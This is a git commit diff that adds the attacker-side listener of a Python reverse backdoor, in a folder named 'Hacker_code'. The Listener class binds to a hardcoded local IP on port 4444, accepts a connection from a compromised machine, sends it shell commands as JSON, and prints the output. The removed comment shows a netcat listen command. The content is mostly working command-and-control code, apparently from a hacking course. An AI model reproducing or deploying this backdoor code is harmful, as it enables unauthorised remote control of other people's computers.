a920faea7e937b598f024c38e83ec5a803819dc6
Pat Felix <pat_pg@hotmail.fr>
2025-03-21 14:14:57 -0400

    implemented the Listener class and added json objects for a reliable consistent stream of bytes

--- Reverse_Backdoor/Hacker_code/reverse_backdoor.py
+++ Reverse_Backdoor/Hacker_code/reverse_backdoor.py
@@ -1,3 +1,43 @@
+import socket, json
 
-# To open a port and listen. we will use a tool called netcut
-#  use the following command: nc -vv -l -p 4444
+class Listener:
+
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("[+] Waiting for incoming connections")
+        self.connection, address = listener.accept()
+        print(f"[+] Got a connection from {str(address)}")
+    
+    def reliable_send(self, data):
+        json_data = json.dumps(data.split(" "))
+        self.connection.send(json_data.encode())
+    
+    def reliable_receive(self):
+        json_data = ''
+        while True:
+            try:
+                json_data += self.connection.recv(1024).decode()
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def execute_remotely(self, command):
+           self.reliable_send(command)
+           return self.reliable_receive()
+    
+    def run(self):
+        while True:
+            command = input("Enter cmd >> ")
+            if command == "exit":
+                self.reliable_send(command)
+                break
+            else:
+                result = self.execute_remotely(command)
+                print(result)
+        self.connection.close()
+
+my_listener = Listener("192.168.60.2", 4444)
+my_listener.run()
